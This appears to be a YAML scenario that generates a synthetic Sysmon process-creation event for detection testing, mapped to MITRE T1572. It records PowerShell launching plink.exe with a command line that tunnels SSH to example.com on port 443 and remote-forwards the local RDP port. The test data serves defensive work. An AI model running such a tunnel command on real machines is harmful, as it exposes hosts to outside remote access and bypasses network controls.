type: scenario
description: |
  The PuTTY command-line SSH client opens a connection with a remote port
  forward back to the local RDP port. Sysmon EID 1 (Process Create) records
  powershell.exe starting plink.exe, for example from the user's Downloads
  folder, with a command line that connects over SSH to a remote host, for
  example example.com on port 443, passes a user name and password, and asks
  the remote host to forward a port, for example 443, to 127.0.0.1:3389 on
  the local machine (-R). The original file name in the file's version
  information is Plink.
  The event records the launch and its command line, not whether the
  connection or the forward succeeded.
tags: [eid1, plink]
mitre:
  tactics: [command-and-control]
  techniques: [T1572]

state:
  domain_short:        CORP
  domain_tld:          local
  domain_short_lower:  fn.lower(ref.domain_short)
  domain_fqdn:         "${ref.domain_short_lower}.${ref.domain_tld}"
  host_short:          gen.hostname(class=windows-workstation)
  host_short_lower:    fn.lower(ref.host_short)
  computer:            "${ref.host_short_lower}.${ref.domain_fqdn}"
  user_name:           Administrator
  user:                "${ref.domain_short}\\${ref.user_name}"
  sysmon_pid:          gen.int(min=1000, max=4000)
  sysmon_tid:          gen.int(min=1000, max=9999)
  event_record_id:     gen.int(min=5000, max=99999)
  logon_guid_raw:      fn.upper(gen.uuid())
  logon_guid:          "{${ref.logon_guid_raw}}"
  logon_id_hex:        gen.hex(len=6, case=lower)
  logon_id:            "0x${ref.logon_id_hex}"
  terminal_session_id: 2
  process_guid_raw:    fn.upper(gen.uuid())
  process_guid:        "{${ref.process_guid_raw}}"
  process_id:          gen.int(min=1000, max=4999)
  parent_guid_raw:     fn.upper(gen.uuid())
  parent_process_guid: "{${ref.parent_guid_raw}}"
  parent_process_id:   gen.int(min=5000, max=9999)
  tool_dir:            "C:\\Users\\${ref.user_name}\\Downloads"
  image:               "${ref.tool_dir}\\plink.exe"
  current_directory:   "${ref.tool_dir}\\"
  remote_host:         example.com
  ssh_port:            443
  ssh_user:            admin1
  ssh_password:        gen.int(min=1000000000, max=9999999999)
  remote_forward:      "${ref.remote_host}:443:127.0.0.1:3389"
  command_line:        "\"${ref.image}\" -ssh -P ${ref.ssh_port} -l ${ref.ssh_user} -pw ${ref.ssh_password} -R ${ref.remote_forward} ${ref.remote_host}"
  parent_image:        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
  # The trailing space is part of the recorded command line.
  parent_command_line: "\"${ref.parent_image}\" "

steps:
  - emit:
      event_type: windows.wineventlog@v1
      fields:
        System:
          Provider:
            "@Name": Microsoft-Windows-Sysmon
            "@Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          EventID: 1
          Version: 5
          Level: 4
          Task: 1
          Opcode: 0
          Keywords: "0x8000000000000000"
          TimeCreated:
            "@SystemTime": gen.timestamp(format=wineventlog)
          EventRecordID: ref.event_record_id
          Correlation: {}
          Execution:
            "@ProcessID": ref.sysmon_pid
            "@ThreadID": ref.sysmon_tid
          Channel: Microsoft-Windows-Sysmon/Operational
          Computer: ref.computer
          Security:
            "@UserID": S-1-5-18
        EventData:
          Data:
            - "@Name": RuleName
              "#text": "-"
            - "@Name": UtcTime
              "#text": gen.timestamp(format=sysmon)
            - "@Name": ProcessGuid
              "#text": ref.process_guid
            - "@Name": ProcessId
              "#text": ref.process_id
            - "@Name": Image
              "#text": ref.image
            - "@Name": FileVersion
              "#text": Release 0.77
            - "@Name": Description
              "#text": Command-line SSH, Telnet, and Rlogin client
            - "@Name": Product
              "#text": PuTTY suite
            - "@Name": Company
              "#text": Simon Tatham
            - "@Name": OriginalFileName
              "#text": Plink
            - "@Name": CommandLine
              "#text": ref.command_line
            - "@Name": CurrentDirectory
              "#text": ref.current_directory
            - "@Name": User
              "#text": ref.user
            - "@Name": LogonGuid
              "#text": ref.logon_guid
            - "@Name": LogonId
              "#text": ref.logon_id
            - "@Name": TerminalSessionId
              "#text": ref.terminal_session_id
            - "@Name": IntegrityLevel
              "#text": High
            - "@Name": Hashes
              "#text": "MD5=41C8E38B48C792EF480A19B8A857CD36,SHA256=653EDDE8520F10019C571F25AD6E61147C06EEECCC7639F69D61D1375CC71EAA"
            - "@Name": ParentProcessGuid
              "#text": ref.parent_process_guid
            - "@Name": ParentProcessId
              "#text": ref.parent_process_id
            - "@Name": ParentImage
              "#text": ref.parent_image
            - "@Name": ParentCommandLine
              "#text": ref.parent_command_line
